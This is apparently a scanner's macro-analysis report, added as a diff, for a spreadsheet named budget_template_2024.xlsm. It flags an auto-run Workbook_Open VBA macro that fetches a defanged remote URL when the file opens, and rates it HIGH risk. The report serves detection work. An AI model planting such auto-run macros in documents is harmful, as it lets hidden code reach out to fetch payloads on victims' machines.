@@ -1,0 +1,10 @@
+Office Document Scanner — Macro Analysis:
+File: budget_template_2024.xlsm
+VBA Module 'ThisWorkbook' contains:
+  Sub Workbook_Open()
+    Dim http As Object: Set http = CreateObject("MSXML2.XMLHTTP")
+    http.Open "GET", "https://cdn-macro[.]storage[.]workers[.]dev/update?v=2", False
+    http.send
+  End Sub
+Macro references external URL on workbook open event.
+Classification: HIGH — potential remote code loading via macro.
